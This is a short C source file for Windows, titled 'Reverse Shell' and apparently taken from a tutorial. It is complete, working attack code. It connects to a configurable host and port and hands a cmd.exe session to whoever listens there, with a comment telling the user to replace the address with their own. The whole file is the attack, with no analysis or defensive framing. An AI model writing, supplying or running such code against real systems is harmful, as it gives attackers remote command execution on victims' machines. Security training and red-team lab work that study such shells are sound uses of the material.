/*
Title: Reverse Shell
Resources:
	- https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html
*/

#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
	// Replace with your IP and port
	const char* ip = "127.0.0.1";
	short port = 4444;

	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return EXIT_FAILURE;
	}

	SOCKET wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (wSock == INVALID_SOCKET) {
		return EXIT_FAILURE;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
		return EXIT_FAILURE;
	}

	// Connect to remote host
	if (WSAConnect(wSock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) {
		printf("Error: %d\n", WSAGetLastError());
		return EXIT_FAILURE;
	}

	STARTUPINFO si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;

	wchar_t cmd[] = L"cmd.exe";
	PROCESS_INFORMATION pi;
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return EXIT_SUCCESS;
}